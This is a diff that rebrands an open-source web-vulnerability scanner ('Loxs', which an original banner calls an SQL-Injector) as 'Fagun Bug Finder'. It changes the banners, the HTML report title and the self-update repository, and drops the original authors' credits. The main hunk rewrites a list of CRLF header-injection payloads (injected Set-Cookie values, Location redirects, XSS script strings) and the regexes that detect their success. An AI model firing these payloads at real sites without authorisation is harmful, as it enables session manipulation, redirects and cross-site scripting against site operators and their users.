@@ -217,7 +217,7 @@ try:
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Loxs Security Scan Report</title>
+            <title>Fagun Security Scan Report</title>
             <style>
                 @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                 
@@ -568,13 +568,13 @@ try:
                         </line>
                     </g>
 
-                    <!-- LOXS Text -->
+                    <!-- Fagun Text -->
                     <g transform="translate(150,100)">
-                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">LOXS</text>
+                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">Fagun</text>
                     </g>
                     </svg>
                 </div>
-                <h1 class="animated-text" data-text="Loxs Security Scan Report">Loxs Security Scan Report</h1>
+                <h1 class="animated-text" data-text="Fagun Security Scan Report">Fagun Security Scan Report</h1>
                 <div class="summary">
                     <div class="summary-item">
                         <span class="summary-label">Scan Type:</span>
@@ -758,12 +758,12 @@ try:
                                 print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                                 input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                                 clear_screen()
-                                print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+                                print(f"{Fore.GREEN}Welcome to the Fagun Bug Finder!\n")
                     except Exception as e:
                         print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                         input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                         clear_screen()
-                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+                        print(f"{Fore.GREEN}Welcome to the Fagun Bug Finder!\n")
 
             def prompt_for_payloads():
                 while True:
@@ -778,7 +778,7 @@ try:
                         print(f"{Fore.RED}[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                         input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                         clear_screen()
-                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+                        print(f"{Fore.GREEN}Welcome to the Fagun Bug Finder!\n")
 
             def print_scan_summary(total_found, total_scanned, start_time):
                 summary = [
@@ -1910,43 +1910,43 @@ try:
         def generate_payloads(url):
             domain = get_domain(url)
             base_payloads = [
-                "/%%0a0aSet-Cookie:loxs=injected",
-                "/%0aSet-Cookie:loxs=injected;",
-                "/%0aSet-Cookie:loxs=injected",
-                "/%0d%0aLocation: http://loxs.pages.dev",
+                "/%%0a0aSet-Cookie:fagun=injected",
+                "/%0aSet-Cookie:fagun=injected;",
+                "/%0aSet-Cookie:fagun=injected",
+                "/%0d%0aLocation: http://fagun.pages.dev",
                 "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
-                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+                "/%0d%0a%0d%0a<script>alert('Fagun')</script>;",
                 "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
-                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
-                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
-                "/%0d%0aLocation: loxs.pages.dev",
-                "/%0d%0aSet-Cookie:loxs=injected;",
-                "/%0aSet-Cookie:loxs=injected",
+                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('Fagun');</script>",
+                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: fagun=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: fagun=injected%0d%0a%0d%0a",
+                "/%0d%0aLocation: fagun.pages.dev",
+                "/%0d%0aSet-Cookie:fagun=injected;",
+                "/%0aSet-Cookie:fagun=injected",
                 "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
-                "/%23%0aSet-Cookie:loxs=injected",
-                "/%25%30%61Set-Cookie:loxs=injected",
-                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+                "/%23%0aSet-Cookie:fagun=injected",
+                "/%25%30%61Set-Cookie:fagun=injected",
+                "/%2e%2e%2f%0d%0aSet-Cookie:fagun=injected",
                 "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
-                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
-                "/%5Cr%20Set-Cookie:loxs=injected;",
-                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
-                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
-                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
-                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
-                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-                "/%u000ASet-Cookie:loxs=injected;",
-                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
-                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+                "/%3f%0d%0aLocation:%0d%0afagun-x:fagun-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+                "/%5Cr%20Set-Cookie:fagun=injected;",
+                "/%5Cr%5Cn%20Set-Cookie:fagun=injected;",
+                "/%5Cr%5Cn%5CtSet-Cookie:fagun%5Cr%5CtSet-Cookie:fagun=injected;",
+                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:fagun=injected;",
+                "/%E5%98%8A%E5%98%8DLocation:fagun.pages.dev",
+                "/%E5%98%8D%E5%98%8ALocation:fagun.pages.dev",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:fagun=injected",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:fagun =injected;",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:fagun=injected",
+                "/%u000ASet-Cookie:fagun=injected;",
+                "/fagun.pages.dev/%2E%2E%2F%0D%0Afagun-x:fagun-x",
+                "/fagun.pages.dev/%2F..%0D%0Afagun-x:fagun-x"
             ]
             
             return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]
 
         REGEX_PATTERNS = [
-            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
-            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)fagun\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?fagun=injected(?:\s*?)(?:$|;)))',
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)fagun\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?fagun=injected(?:\s*?)(?:$|;)|fagun-x))'
         ]
 
         def get_random_user_agent():
@@ -2166,13 +2166,13 @@ try:
 ██    ██ ██      ██    ██ ██   ██    ██    ██      
 ████████ ██      ███████  ██   ██    ██    ███████ 
         """,
-                title="LOXS UPDATER",
+                title="fAGUN UPDATER",
                 expand=False,
                 border_style="blue",
                 style="bold green",
             )
             console.print(panel)
-            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")
+            console.print("[cyan] Welcome to the Fagun updater![/cyan]\n")
 
         def get_latest_release(repo_owner, repo_name):
             url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
@@ -2225,8 +2225,8 @@ try:
 
         display_update_intro()
 
-        repo_owner = "coffinxp"
-        repo_name = "loxs"
+        repo_owner = "fagun18"
+        repo_name = "Fagun-Bug-Finder"
         current_version = get_current_version()
 
         if current_version is None:
@@ -2256,7 +2256,7 @@ try:
                     download_url = release_data['assets'][0]['browser_download_url']
                     
                     if download_update(download_url, __file__):
-                        console.print("[green][✓] Update completed. Please restart loxs..!![/green]")
+                        console.print("[green][✓] Update completed. Please restart Fagun..!![/green]")
                     else:
                         console.print("[red][!] Update failed.[/red]")
                 except (KeyError, IndexError) as e:
